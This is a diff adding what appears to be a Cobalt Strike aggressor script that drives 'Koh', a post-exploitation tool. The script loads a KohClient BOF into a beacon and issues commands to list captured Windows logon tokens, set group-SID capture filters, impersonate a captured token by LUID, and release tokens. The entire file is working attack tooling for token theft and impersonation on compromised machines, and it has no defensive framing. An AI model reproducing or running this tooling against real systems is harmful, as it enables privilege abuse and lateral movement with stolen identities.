@@ -1,0 +1,137 @@
+
+beacon_command_register(
+"koh", 
+"Interacts with a running Koh server.",
+"koh list              - lists captured tokens\n".
+"koh groups LUID       - lists the group SIDs for a captured token\n".
+"koh filter list       - lists the group SIDs used for capture filtering\n".
+"koh filter add SID    - adds a group SID for capture filtering\n".
+"koh filter remove SID - removes a group SID from capture filtering\n".
+"koh filter reset      - resets the SID group capture filter\n".
+"koh impersonate LUID  - impersonates the captured token with the give LUID\n".
+"koh release all       - releases all captured tokens\n".
+"koh release LUID      - releases the captured token for the specified LUID\n".
+"koh exit              - signals the Koh server to exit\n");
+
+
+alias koh {
+    local('$0 $1 $2 $3 $bid $barch $BOFPath $bofArgs $command $handle $bofData')
+
+    $bid = $1;
+    $command = $2;
+
+    $bofArgs = $null;
+
+    $barch = barch($bid);
+    $BOFPath = script_resource("KohClient." . $barch . ".o");
+
+    try {
+        $handle = openf($BOFPath);
+        $bofData = readb($handle, -1);
+        closef($handle);
+        if(strlen($bofData) < 1)
+        {
+            berror($bid, "KohClient BOF not found!");
+            return;
+        }
+    }
+    catch $message
+    {
+        berror($bid, "KohClient BOF not found!");
+        return;
+    }
+
+    # Koh commands:
+
+    #      1           - list captured tokens
+    #      2 LUID      - list groups for a captured token
+    
+    #      100         - list group SIDs currently used for capture filtering
+    #      101 SID     - adds group SID for capture filtering
+    #      102 SID     - removes a group SID for capture filtering
+    #      103         - resets all group SIDs for capture filtering
+
+    #      200 LUID    - lists the groups for the specified LUID/captured token
+    
+    #      300 LUID    - impersonate a captured token
+
+    #      400         - release all tokens
+    #      401 LUID    - release a token for the specifed LUID
+
+    #      57005       - signal Koh to exit
+
+    if($command iswm "list") {
+        if($3 == $null) {
+            $bofArgs = bof_pack($bid, "iiz", 1, 0, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else {
+            $bofArgs = bof_pack($bid, "iiz", 2, $3, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+    }
+    else if($command iswm "filter") {
+        if($3 iswm "list") {
+            $bofArgs = bof_pack($bid, "iiz", 100, 0, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else if($3 iswm "add") {
+            $bofArgs = bof_pack($bid, "iiz", 101, 0, $4);
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else if($3 iswm "remove") {
+            $bofArgs = bof_pack($bid, "iiz", 102, 0, $4);
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else if($3 iswm "reset") {
+            $bofArgs = bof_pack($bid, "iiz", 103, 0, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else {
+            berror($1, "Usage: koh filter [list | add SID | remove SID | reset]");
+            return;
+        }
+    }
+    else if($command iswm "groups") {
+        if($3 != $null) {
+            $bofArgs = bof_pack($bid, "iiz", 200, $3, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else {
+            berror($1, "LUID required!");
+            return;
+        }
+    }
+    else if($command iswm "impersonate") {
+        if($3 != $null) {
+            $bofArgs = bof_pack($bid, "iiz", 300, $3, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else {
+            berror($1, "LUID required!");
+            return;
+        }
+    }
+    else if($command iswm "release") {
+        if($3 iswm "all") {
+            $bofArgs = bof_pack($bid, "iiz", 400, 0, "");
+            beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+        }
+        else {
+            if($3 != $null) {
+                $bofArgs = bof_pack($bid, "iiz", 401, $3, "");
+                beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+            }
+            else {
+                berror($1, "'release all' or 'release LUID' required");
+            }
+        }
+    }
+    else if($command iswm "exit") {
+        $bofArgs = bof_pack($bid, "iiz", 57005, 0, "");
+        beacon_inline_execute($bid, $bofData, "go", $bofArgs);
+    }
+    else {
+        berror($1, "Invalid usage!");
+    }
+}
